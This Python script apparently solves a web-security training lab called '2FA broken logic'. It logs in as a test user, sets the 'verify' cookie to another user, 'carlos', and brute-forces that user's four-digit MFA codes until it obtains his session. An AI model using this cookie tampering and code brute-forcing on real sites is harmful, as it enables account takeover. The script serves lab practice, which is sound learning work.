import requests
import urllib3
import re
import time
from colorama import Fore

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

LAB_NAME = "2FA broken logic"
SCRIPT_START_TIME = time.time()


def read_list(files_path):
    try:
        return open(files_path, 'rt').read().splitlines()
    except:
        print(Fore.RED + "[!] Failed to open the file " + files_path)
        exit(1)


def print_progress(counter, total_counts, text):
    elapsed = int(time.time() - SCRIPT_START_TIME)
    print(Fore.WHITE + "Elapsed: " + Fore.YELLOW + str(elapsed) +
          Fore.WHITE + f" seconds || Trying ({counter+1}/{total_counts}): " + Fore.BLUE + f"{text:50}", end='\r', flush=True)


def brute_force_mfa_code(cookies, session, url):
    for (counter, code) in enumerate(range(5000, 10000)):
        data = {"mfa-code": f"{code:04}"}
        response = session.post(f"{url}/login2", data=data, cookies=cookies)
        if response != None and response.status_code == 302:
            print(Fore.WHITE + f"\nCorrect code: " + Fore.GREEN + f"{code:04}")
            new_session = response.cookies.get("session")
            return new_session
        else:
            print_progress(counter, 10000, code)


def run(url, payload, proxies=None):
    url = url.rstrip('/')
    session = requests.Session()
    session.proxies = proxies or {}
    session.verify = False

    print(Fore.WHITE + "[1] getting a valid session..")
    data = {"username": "wiener", "password": "peter"}
    login_as_wiener = session.post(f"{url}/login", data, allow_redirects=False)
    sessioncookie = login_as_wiener.cookies.get("session")

    # must fetch the login2 page to make the mfa-code be sent to the mail server
    print(Fore.WHITE + "[2] fetching login2 page..")
    cookies = {"session": sessioncookie, "verify": "carlos"}
    session.get(f"{url}/login2", cookies=cookies, allow_redirects=False)

    print(Fore.WHITE + "[3] Start brute forcing the mfa-code of carlos")
    carlos_session = brute_force_mfa_code(cookies, session, url)
    cookies = {"session": carlos_session}

    try:
        session.get(f"{url}/my-account", cookies=cookies,
                    allow_redirects=False)
        elapsed_time = int((time.time() - SCRIPT_START_TIME) / 60)
        print(Fore.WHITE + "Finished in: " +
              Fore.YELLOW + str(elapsed_time) + " minutes")
        return True
    except Exception as e:
        print(Fore.RED + f"[!] Error: {e}")
        return False
